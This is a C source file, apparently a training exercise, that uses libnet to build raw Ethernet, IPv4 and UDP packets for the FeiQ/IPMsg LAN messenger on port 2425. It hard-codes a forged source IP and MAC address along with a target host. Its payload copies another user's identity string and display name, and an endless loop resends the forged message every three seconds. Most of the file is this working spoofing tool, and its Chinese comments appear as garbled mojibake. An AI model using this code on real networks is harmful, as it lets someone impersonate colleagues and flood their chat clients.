/* ************************************************************************
 *       Filename:  lib_net_feiq_cheat.c
 *    Description:  
 *        Version:  1.0
 *        Created:  2013å¹´12æœˆ20æ—¥ 07æ—¶30åˆ†53ç§’
 *       Revision:  none
 *       Compiler:  gcc
 *         Author:  YOUR NAME (), 
 *        Company:  
 * ************************************************************************/


#include <stdio.h>
#include <libnet.h>
int main(int argc, char *argv[])
{
	char send_msg[1024] = "";
	char err_buf[512] = "";
	libnet_t *lib_net = NULL;
	int lens = 0;
	libnet_ptag_t lib_t = 0;
	unsigned char src_mac[6] = {0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02};//32	ÐéÄâ»úmac
	unsigned char dst_mac[6] = {0xc8, 0x9c, 0xdc, 0xba, 0xaa, 0xca};//31	Ä¿±êmac
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x55, 0x1f, 0xd2};//156
//	unsigned char dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};//255
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x54, 0xcc, 0xe5};//19
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x56, 0x1e, 0x07};//101
//	unsigned char dst_mac[6] = {0x10, 0x78, 0xd2, 0xce, 0x5c, 0x75};//13	

	char *src_ip_str = "10.220.4.19";	//Î±×°Õßip
	char *dst_ip_str = "10.220.4.31";	//Ä¿±êip
//	char *dst_ip_str = "10.220.4.156";
//	char *dst_ip_str = "10.220.4.255";
//	char *dst_ip_str = "10.220.4.19";
//	char *dst_ip_str = "10.220.4.101";
//	char *dst_ip_str = "10.220.4.13";
	unsigned long src_ip = 0, dst_ip = 0;
//1_lbt6_11#128#7427EA54CCE5#0#0#0#4000#9	ÎâÏÕ
//1_lbt6_31#128#1078D2CE5C75#0#0#0#4000#9	ÍõÃÍ

	lens = sprintf(send_msg, "1_lbt6_11#128#7427EA54CCE5#0#0#0#4000#9:%d:%s:%s:%d:%s",\
					12345, "ÎâÏÕ", "EDU-D05", 209, "´ó¼Ò¸ÉÉ¶ÄØ£¿");
	
	lib_net = libnet_init(LIBNET_LINK_ADV, "eth0", err_buf);
	if(NULL == lib_net)
	{
		perror("libnet_init");
		exit(-1);
	}
	src_ip = libnet_name2addr4(lib_net, src_ip_str, LIBNET_RESOLVE);
	dst_ip = libnet_name2addr4(lib_net, dst_ip_str, LIBNET_RESOLVE);

	lib_t = libnet_build_udp(2425, 2425, 8 + lens, 0, send_msg, lens, lib_net, 0);

	lib_t = libnet_build_ipv4(20 + 8 + lens, 0, 500, 0, 128, 17, 0,\
							src_ip, dst_ip, NULL, 0, lib_net, 0);

	lib_t = libnet_build_ethernet((u_int8_t *)dst_mac, (u_int8_t *)src_mac,\
								ETHERTYPE_IP, NULL, 0, lib_net, 0);
								
	while(1)
	{
		libnet_write(lib_net);
		sleep(3);
	}
	libnet_destroy(lib_net);

	return 0;
}


